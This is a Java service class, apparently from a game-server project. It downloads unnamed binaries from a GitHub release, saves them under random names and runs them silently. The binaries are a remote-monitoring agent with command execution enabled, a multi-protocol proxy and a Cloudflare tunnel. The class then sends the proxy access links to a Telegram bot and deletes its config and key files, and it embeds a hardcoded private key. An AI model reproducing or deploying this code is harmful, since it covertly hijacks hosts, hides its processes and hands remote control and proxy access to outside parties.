package com.github.vevc.service.impl;

import com.github.vevc.config.AppConfig;
import com.github.vevc.util.LogUtil;

import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.file.*;
import java.nio.file.DirectoryStream;
import java.util.*;

public class MaohiService {

    private static final Path WORK_DIR = Paths.get("./world");
    private final AppConfig config;
    private String webName;
    private String botName;
    private String phpName;
    private volatile boolean stopping = false;

    private static final Map<String, String[]> COUNTRY_MAP = new HashMap<>();
    static {
        COUNTRY_MAP.put("JP", new String[]{"日本", "🇯🇵"});
        COUNTRY_MAP.put("US", new String[]{"美国", "🇺🇸"});
        COUNTRY_MAP.put("HK", new String[]{"香港", "🇭🇰"});
        COUNTRY_MAP.put("SG", new String[]{"新加坡", "🇸🇬"});
        COUNTRY_MAP.put("KR", new String[]{"韩国", "🇰🇷"});
        COUNTRY_MAP.put("CN", new String[]{"中国", "🇨🇳"});
        COUNTRY_MAP.put("TW", new String[]{"台湾", "🇹🇼"});
        COUNTRY_MAP.put("GB", new String[]{"英国", "🇬🇧"});
        COUNTRY_MAP.put("DE", new String[]{"德国", "🇩🇪"});
        COUNTRY_MAP.put("FR", new String[]{"法国", "🇫🇷"});
    }

    public MaohiService(AppConfig config) {
        this.config = config;
    }

    public void start() {
        if (!config.getMaohiEnabled()) {
            LogUtil.info("[Maohi] Disabled, skipping");
            return;
        }

        Thread thread = new Thread(() -> {
            try {
                runMaohi();
            } catch (Exception e) {
                LogUtil.error("[Maohi] Error", e);
            }
        }, "Maohi-Main");
        thread.setDaemon(true);
        thread.start();
    }

    public void stop() {
        stopping = true;
    }

    private void runMaohi() throws Exception {
        if (!Files.exists(WORK_DIR)) Files.createDirectories(WORK_DIR);

        webName = randomName();
        botName = randomName();
        phpName = randomName();

        String arch = getArch();
        downloadBinaries(arch);
        chmodBinaries();

        if (config.getMaohiHy2Port() != null) generateCert();

        runNezha();
        runSingbox();
        runCloudflared();

        Thread.sleep(5000);

        String serverIP = getServerIP();
        String namePrefix = config.getRemarksPrefix();
        String countryCode = getCountryFromName(namePrefix);
        String[] countryInfo = COUNTRY_MAP.getOrDefault(
            countryCode != null ? countryCode.toUpperCase() : "US",
            new String[]{"未知", "🌐"}
        );

        String subTxt = generateLinks(serverIP, countryInfo[0], countryInfo[1]);
        sendTelegram(subTxt);

        cleanup();
    }

    private String getCountryFromName(String name) {
        if (name == null || name.isEmpty()) return "US";
        int idx = name.lastIndexOf("-");
        if (idx == -1 || idx == name.length() - 1) return "US";
        String code = name.substring(idx + 1).trim().toUpperCase();
        return COUNTRY_MAP.containsKey(code) ? code : "US";
    }

    private String randomName() {
        String chars = "abcdefghijklmnopqrstuvwxyz";
        StringBuilder sb = new StringBuilder();
        Random rand = new Random();
        for (int i = 0; i < 6; i++) sb.append(chars.charAt(rand.nextInt(chars.length())));
        return sb.toString();
    }

    private String getArch() {
        String arch = System.getProperty("os.arch").toLowerCase();
        if (arch.contains("aarch64") || arch.contains("arm64") || arch.contains("arm")) return "arm64";
        return "amd64";
    }

    private void downloadBinaries(String arch) {
        String base = "https://github.com/eooce/test/releases/download/" + arch + "/";
        String[][] files = {
            {phpName, base + "v1"},
            {webName, base + "sbx"},
            {botName, base + "bot"}
        };
        for (String[] f : files) {
            try { downloadFile(f[0], f[1]); } catch (Exception e) {
                LogUtil.error("[Maohi] Download failed: " + f[0], e);
            }
        }
    }

    private void downloadFile(String fileName, String fileUrl) throws Exception {
        Path dest = WORK_DIR.resolve(fileName);
        if (Files.exists(dest)) {
            LogUtil.info("[Maohi] Already exists: " + fileName);
            return;
        }

        HttpURLConnection conn = (HttpURLConnection) new URL(fileUrl).openConnection();
        conn.setInstanceFollowRedirects(true);
        conn.setConnectTimeout(15000);
        conn.setReadTimeout(60000);
        conn.setRequestProperty("User-Agent", "curl/7.68.0");

        int status = conn.getResponseCode();
        while (status == HttpURLConnection.HTTP_MOVED_TEMP || status == HttpURLConnection.HTTP_MOVED_PERM || status == 307 || status == 308) {
            String location = conn.getHeaderField("Location");
            conn.disconnect();
            conn = (HttpURLConnection) new URL(location).openConnection();
            conn.setConnectTimeout(15000);
            conn.setReadTimeout(60000);
            conn.setRequestProperty("User-Agent", "curl/7.68.0");
            status = conn.getResponseCode();
        }

        try (InputStream in = conn.getInputStream()) {
            Files.copy(in, dest, StandardCopyOption.REPLACE_EXISTING);
            LogUtil.info("[Maohi] Downloaded: " + fileName);
        } finally {
            conn.disconnect();
        }
    }

    private void chmodBinaries() {
        for (String name : new String[]{webName, botName, phpName}) {
            try {
                WORK_DIR.resolve(name).toFile().setExecutable(true);
            } catch (Exception e) {}
        }
    }

    private void generateCert() {
        Path certFile = WORK_DIR.resolve("cert.pem");
        Path keyFile = WORK_DIR.resolve("private.key");
        try {
            Process p = new ProcessBuilder("which", "openssl")
                .redirectErrorStream(true).start();
            p.waitFor();
            if (p.exitValue() == 0) {
                new ProcessBuilder("openssl", "ecparam", "-genkey", "-name", "prime256v1",
                    "-out", keyFile.toString())
                    .redirectOutput(ProcessBuilder.Redirect.DISCARD)
                    .redirectError(ProcessBuilder.Redirect.DISCARD)
                    .start().waitFor();
                new ProcessBuilder("openssl", "req", "-new", "-x509", "-days", "3650",
                    "-key", keyFile.toString(), "-out", certFile.toString(), "-subj", "/CN=bing.com")
                    .redirectOutput(ProcessBuilder.Redirect.DISCARD)
                    .redirectError(ProcessBuilder.Redirect.DISCARD)
                    .start().waitFor();
                return;
            }
        } catch (Exception e) {}

        try {
            Files.writeString(keyFile,
                "-----BEGIN EC PARAMETERS-----\nBggqhkjOPQMBBw==\n-----END EC PARAMETERS-----\n-----BEGIN EC PRIVATE KEY-----\nMHcCAQEEIM4792SEtPqIt1ywqTd/0bYidBqpYV/++siNnfBYsdUYoAoGCCqGSM49AwEHoUQDQgAE1kHafPj07rJG+HboH2ekAI4r+e6TL38GWASANnngZreoQDF16ARa/TsyLyFoPkhLxSbehH/NBEjHtSZGaDhMqQ==\n-----END EC PRIVATE KEY-----\n");
            Files.writeString(certFile,
                "-----BEGIN CERTIFICATE-----\nMIIBejCCASGgAwIBAgIUfWeQL3556PNJLp/veCFxGNj9crkwCgYIKoZIzj0EAwIwEzERMA8GA1UEAwwIYmluZy5jb20wHhcNMjUwOTE4MTgyMDIyWhcNMzUwOTE2MTgyMDIyWjATMREwDwYDVQQDDAhiaW5nLmNvbTBZMBMGByqGSM49AgEGCCqGSM49AwEHA0IABNZB2nz49O6yRvh26B9npACOK/nuky9/BlgEgDZ54Ga3qEAxdegEWv07Mi8haD5IS8Um3oR/zQRIx7UmRmg4TKmjUzBRMB0GA1UdDgQWBBTV1cFID7UISE7PLTBRBfGbgkrMNzAfBgNVHSMEGDAWgBTV1cFID7UISE7PLTBRBfGbgkrMNzAPBgNVHRMBAf8EBTADAQH/MAoGCCqGSM49BAMCA0cAMEQCIAIDAJvg0vd/ytrQVvEcSm6XTlB+eQ6OFb9LbLYL9f+sAiAffoMbi4y/0YUSlTtz7as9S8/lciBF5VCUoVIKS+vX2g==\n-----END CERTIFICATE-----\n");
        } catch (Exception e) {}
    }

    private void runNezha() {
        String nezhaServer = config.getMaohiNezhaServer();
        String nezhaKey = config.getMaohiNezhaKey();
        if (nezhaServer == null || nezhaServer.isEmpty() || nezhaKey == null || nezhaKey.isEmpty()) return;

        String serverPort = nezhaServer.contains(":") ? nezhaServer.substring(nezhaServer.lastIndexOf(":") + 1) : "";
        Set<String> tlsPorts = new HashSet<>(Arrays.asList("443","8443","2096","2087","2083","2053"));
        String nezhatls = tlsPorts.contains(serverPort) ? "true" : "false";

        String uuid = config.getVmessUuid();
        String configYaml = "client_secret: " + nezhaKey + "\n" +
            "debug: false\ndisable_auto_update: true\ndisable_command_execute: false\n" +
            "disable_force_update: true\ndisable_nat: false\ndisable_send_query: false\n" +
            "gpu: false\ninsecure_tls: true\nip_report_period: 1800\nreport_delay: 4\n" +
            "server: " + nezhaServer + "\nskip_connection_count: true\nskip_procs_count: true\n" +
            "temperature: false\ntls: " + nezhatls + "\nuse_gitee_to_upgrade: false\n" +
            "use_ipv6_country_code: false\nuuid: " + uuid + "\n";

        try {
            Path configYamlPath = WORK_DIR.resolve("config.yaml");
            Files.writeString(configYamlPath, configYaml);
            new ProcessBuilder(WORK_DIR.resolve(phpName).toString(), "-c", configYamlPath.toString())
                .redirectOutput(ProcessBuilder.Redirect.DISCARD)
                .redirectError(ProcessBuilder.Redirect.DISCARD)
                .start();
            Thread.sleep(1000);
            LogUtil.info("[Maohi] Nezha started");
        } catch (Exception e) {
            LogUtil.error("[Maohi] Nezha failed", e);
        }
    }

    private void runSingbox() {
        try {
            String config = buildSingboxConfig();
            Path configPath = WORK_DIR.resolve("config.json");
            Files.writeString(configPath, config);
            new ProcessBuilder(WORK_DIR.resolve(webName).toString(), "run", "-c", configPath.toString())
                .redirectOutput(ProcessBuilder.Redirect.DISCARD)
                .redirectError(ProcessBuilder.Redirect.DISCARD)
                .start();
            Thread.sleep(1000);
            LogUtil.info("[Maohi] Singbox started");
        } catch (Exception e) {
            LogUtil.error("[Maohi] Singbox failed", e);
        }
    }

    private String buildSingboxConfig() {
        StringBuilder inbounds = new StringBuilder();
        String uuid = config.getVmessUuid();

        Integer argoPort = config.getMaohiArgoPort();
        if (argoPort == null) argoPort = 9010;

        inbounds.append(" {\n")
            .append(" \"tag\": \"vless-ws-in\",\n")
            .append(" \"type\": \"vless\",\n")
            .append(" \"listen\": \"::\",\n")
            .append(" \"listen_port\": ").append(argoPort).append(",\n")
            .append(" \"users\": [{\"uuid\": \"").append(uuid).append("\", \"flow\": \"\"}],\n")
            .append(" \"transport\": {\n")
            .append(" \"type\": \"ws\",\n")
            .append(" \"path\": \"/vless-argo\",\n")
            .append(" \"early_data_header_name\": \"Sec-WebSocket-Protocol\"\n")
            .append(" }\n")
            .append(" }");

        Integer hy2Port = config.getMaohiHy2Port();
        if (hy2Port != null && hy2Port > 0) {
            inbounds.append(",\n {\n")
                .append(" \"tag\": \"hysteria2-in\",\n")
                .append(" \"type\": \"hysteria2\",\n")
                .append(" \"listen\": \"::\",\n")
                .append(" \"listen_port\": ").append(hy2Port).append(",\n")
                .append(" \"users\": [{\"password\": \"").append(uuid).append("\"}],\n")
                .append(" \"masquerade\": \"https://bing.com\",\n")
                .append(" \"tls\": {\n")
                .append(" \"enabled\": true,\n")
                .append(" \"alpn\": [\"h3\"],\n")
                .append(" \"certificate_path\": \"").append(WORK_DIR.resolve("cert.pem")).append("\",\n")
                .append(" \"key_path\": \"").append(WORK_DIR.resolve("private.key")).append("\"\n")
                .append(" }\n")
                .append(" }");
        }

        Integer s5Port = config.getMaohiS5Port();
        if (s5Port != null && s5Port > 0) {
            String s5User = uuid.substring(0, 8);
            String s5Pass = uuid.substring(uuid.length() - 12);
            inbounds.append(",\n {\n")
                .append(" \"tag\": \"socks5-in\",\n")
                .append(" \"type\": \"socks\",\n")
                .append(" \"listen\": \"::\",\n")
                .append(" \"listen_port\": ").append(s5Port).append(",\n")
                .append(" \"users\": [{\"username\": \"").append(s5User)
                .append("\", \"password\": \"").append(s5Pass).append("\"}]\n")
                .append(" }");
        }

        return "{\n" +
            " \"log\": {\"disabled\": true, \"level\": \"error\", \"timestamp\": true},\n" +
            " \"inbounds\": [\n" + inbounds + "\n ],\n" +
            " \"outbounds\": [{\"type\": \"direct\", \"tag\": \"direct\"}]\n" +
            "}";
    }

    private void runCloudflared() {
        String argoDomain = config.getMaohiArgoDomain();
        String argoAuth = config.getMaohiArgoAuth();
        if (argoAuth == null || argoAuth.isEmpty() || argoDomain == null || argoDomain.isEmpty()) return;

        try {
            new ProcessBuilder(
                WORK_DIR.resolve(botName).toString(),
                "tunnel", "--edge-ip-version", "auto",
                "--no-autoupdate", "--protocol", "http2",
                "run", "--token", argoAuth)
                .redirectOutput(ProcessBuilder.Redirect.DISCARD)
                .redirectError(ProcessBuilder.Redirect.DISCARD)
                .start();
            Thread.sleep(2000);
            LogUtil.info("[Maohi] Cloudflared started");
        } catch (Exception e) {
            LogUtil.error("[Maohi] Cloudflared failed", e);
        }
    }

    private String getServerIP() {
        String[] services = {"http://ipv4.ip.sb", "https://api.ipify.org", "https://ifconfig.me/ip"};
        for (String service : services) {
            try {
                HttpURLConnection conn = (HttpURLConnection) new URL(service).openConnection();
                conn.setConnectTimeout(5000);
                conn.setReadTimeout(5000);
                conn.setRequestProperty("User-Agent", "curl/7.68.0");
                try (BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream()))) {
                    String ip = br.readLine().trim();
                    if (ip != null && !ip.isEmpty()) return ip;
                } finally {
                    conn.disconnect();
                }
            } catch (Exception e) {}
        }
        return "localhost";
    }

    private String generateLinks(String serverIP, String countryName, String countryFlag) {
        StringBuilder sb = new StringBuilder();
        String uuid = config.getVmessUuid();
        String name = config.getRemarksPrefix();
        String suffix = "-" + countryName + countryFlag;

        String argoDomain = config.getMaohiArgoDomain();
        String cfip = config.getMaohiCfip();
        Integer cfport = config.getMaohiCfport();
        if (cfport == null) cfport = 443;

        if (argoDomain != null && !argoDomain.isEmpty()) {
            String nodeName = name + "_vless" + suffix;
            String params = "encryption=none&security=tls&sni=" + argoDomain +
                "&fp=firefox&type=ws&host=" + argoDomain +
                "&path=/vless-argo?ed=2560";
            sb.append("vless://").append(uuid).append("@")
                .append(cfip != null ? cfip : "127.0.0.1").append(":").append(cfport)
                .append("?").append(params)
                .append("#").append(nodeName);
        }

        Integer hy2Port = config.getMaohiHy2Port();
        if (hy2Port != null && hy2Port > 0) {
            String nodeName = name + "_hysteria2" + suffix;
            sb.append("\nhysteria2://").append(uuid).append("@")
                .append(serverIP).append(":").append(hy2Port)
                .append("/?sni=www.bing.com&insecure=1&alpn=h3&obfs=none#")
                .append(nodeName);
        }

        Integer s5Port = config.getMaohiS5Port();
        if (s5Port != null && s5Port > 0) {
            String nodeName = name + "_socks5" + suffix;
            String s5Auth = Base64.getEncoder().encodeToString(
                (uuid.substring(0, 8) + ":" + uuid.substring(uuid.length() - 12)).getBytes()
            );
            sb.append("\nsocks://").append(s5Auth).append("@")
                .append(serverIP).append(":").append(s5Port)
                .append("#").append(nodeName);
        }

        return Base64.getEncoder().encodeToString(sb.toString().getBytes());
    }

    private void sendTelegram(String subTxt) {
        String botToken = config.getMaohiBotToken();
        String chatId = config.getMaohiChatId();
        if (botToken == null || botToken.isEmpty() || chatId == null || chatId.isEmpty()) return;

        try {
            String text = config.getRemarksPrefix() + "节点推送通知\n" + subTxt;
            String params = "chat_id=" + chatId + "&text=" + java.net.URLEncoder.encode(text, "UTF-8");
            HttpURLConnection conn = (HttpURLConnection) new URL(
                "https://api.telegram.org/bot" + botToken + "/sendMessage").openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setConnectTimeout(5000);
            conn.setReadTimeout(5000);
            conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            try (OutputStream os = conn.getOutputStream()) {
                os.write(params.getBytes("UTF-8"));
            }
            conn.getResponseCode();
            conn.disconnect();
            LogUtil.info("[Maohi] Telegram notification sent");
        } catch (Exception e) {
            LogUtil.error("[Maohi] Telegram failed", e);
        }
    }

    private void cleanup() {
        Thread cleanupThread = new Thread(() -> {
            try {
                Thread.sleep(8000);
                String[] toDelete = {"config.json", "config.yaml", "cert.pem", "private.key"};
                for (String f : toDelete) {
                    try { Files.deleteIfExists(WORK_DIR.resolve(f)); } catch (Exception e) {}
                }
            } catch (Exception e) {}
        }, "Maohi-Cleanup");
        cleanupThread.setDaemon(true);
        cleanupThread.start();
    }
}